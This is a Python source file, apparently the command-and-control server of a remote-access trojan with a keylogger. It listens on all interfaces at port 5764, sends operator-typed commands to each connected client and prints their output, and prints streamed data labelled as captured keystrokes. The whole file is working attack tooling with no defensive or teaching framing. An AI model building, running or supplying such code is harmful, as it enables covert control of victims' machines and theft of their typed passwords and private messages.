import socket
import threading

HEADER = 50  # bytes to define message length
HOST = '0.0.0.0'  # listen on all interfaces
PORT = 5764

clients = []

def send_command(client_socket):
    try:
        while True:
            command = input(">> ").strip()
            if command == "":
                continue

            # Encode and send command with header
            command_bytes = command.encode('utf-8')
            command_header = f"{len(command_bytes):<{HEADER}}".encode('utf-8')
            client_socket.send(command_header + command_bytes)

            # Receive response
            data = client_socket.recv(4096)
            if not data:
                print("Connection closed by client.")
                break
            print(data.decode('utf-8'))
    except Exception as e:
        print(f"[ERROR] Command loop error: {e}")
        client_socket.close()

def receive_keystrokes(client_socket):
    try:
        while True:
            data = client_socket.recv(1024)
            if data:
                print(f"[KEYSTROKES] {data.decode('utf-8')}")
            else:
                break
    except Exception as e:
        print(f"[ERROR] Keystroke receiver error: {e}")
        client_socket.close()

def handle_client(client_socket, address):
    print(f"[+] New connection from {address}")
    clients.append(client_socket)

    # Start thread for command handling
    threading.Thread(target=send_command, args=(client_socket,), daemon=True).start()
    
    # Main loop: handle keystrokes
    receive_keystrokes(client_socket)

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(5)
    print(f"[LISTENING] Server started on {HOST}:{PORT}")

    try:
        while True:
            client_socket, addr = server.accept()
            threading.Thread(target=handle_client, args=(client_socket, addr), daemon=True).start()
    except KeyboardInterrupt:
        print("\n[SHUTDOWN] Server is shutting down.")
    finally:
        server.close()

if __name__ == "__main__":
    start_server()
